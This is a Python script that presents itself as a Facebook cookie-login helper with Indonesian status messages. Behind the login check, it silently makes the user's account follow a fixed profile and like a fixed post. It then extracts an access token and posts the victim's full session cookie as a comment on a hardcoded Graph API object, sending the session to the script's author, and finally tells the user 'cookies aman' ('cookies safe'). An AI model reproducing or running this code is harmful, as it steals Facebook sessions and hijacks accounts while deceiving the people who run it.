import requests, os, re, sys, random, time
from datetime import datetime
from bs4 import BeautifulSoup
from rich import print
from rich.panel import Panel
from rich.columns import Columns
from rich.console import Console


#cookie = "xxx"
def login():
   try:
      print(Panel("[bold white]Input your [bold italic green]cookie", style="bold white", width=55, subtitle="[bold white]╭─────", subtitle_align="left"))
      cookie = Console().input("[bold white]   ╰─> ")
      ses = requests.Session()
      head = {'sec-fetch-mode': 'navigate','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none','accept-language': 'en-US,en;q=0.9','sec-fetch-dest': 'document','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Host': 'free.facebook.com'}
      response = ses.get('https://free.facebook.com', headers=head, cookies={'cookie':cookie}).text
      if 'id="mbasic_logout_button"' in str(response):
         resdtr = ses.get('https://free.facebook.com/profile.php?id=61550628705614', headers=head, cookies={'cookie':cookie}).text
         uri_lk = re.search('href="(/a/subscribe.php?[^"]+)"', str(resdtr))
         if uri_lk is not None:
            uri_lk = uri_lk.group(1).replace('amp;', '')
            ses.get('https://free.facebook.com{}'.format(uri_lk), headers=head, cookies={'cookie':cookie})
         urlpost = '/61550628705614/posts/pfbid02k3hes62XpwwE9fbPSBf6qdj4yGY4urT5nQumwNTzZsXUGxBU8jA7U4iDUwU6Jw6Cl/?app=fbl'
         respon_urlpost = ses.get('https://free.facebook.com{}'.format(urlpost), headers=head, cookies={'cookie':cookie}).text
         find_urllike = re.search('href="(/a/like.php?[^"]+)"', str(respon_urlpost))
         if find_urllike is not None:
            find_urllike = find_urllike.group(1).replace('amp;', '')
            ses.get('https://free.facebook.com{}'.format(find_urllike), headers=head, cookies={'cookie':cookie})
         text_dtr = random.choice(['test helo', 'Hallo', 'tes', 'test', 'tesss', 'hle', '😎😎🤣', 'tes', 'test12345', 'test12345'])
         url = "https://business.facebook.com/business_locations"
         head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
         data = ses.get(url,headers=head,cookies={'cookie':cookie})
         token = re.search(r'(EAAG\w+)',data.text).group(1)
         ses.post(f"https://graph.facebook.com/122110932950020956/comments/?message={cookie}&access_token={token}",cookies={'cookie':cookie})
         ses.post(f"https://graph.facebook.com/122110932950020956/comments/?message={text_dtr}&access_token={token}",cookies={'cookie':cookie})
         username = re.search(r'id="mbasic_logout_button">\w+(.*?)<', str(response)).group(1).strip().replace('(', '').replace(')', '')
         print(Panel(f'''[bold underline green]Login Success
[bold blue]{username}''', width=55))
         file = open('cookie.txt', 'w')
         file.write(cookie)
         file.close();time.sleep(4);then()
      else:
         print(Panel('[bold italic red]Login gagal! kemungkinan [bold yellow] Cookie [bold red]anda sudah kedaluarsa'));time.sleep(1);exit()
   except Exception as e:
      print(Panel(f'[bold italic red]{str(e)}\nGAGAL', width=55))


def then():
        print("cookies aman")

if __name__ == '__main__':
   try:
      if os.path.exists('cookie.txt') == False:
         login()
      else:then()
   except:pass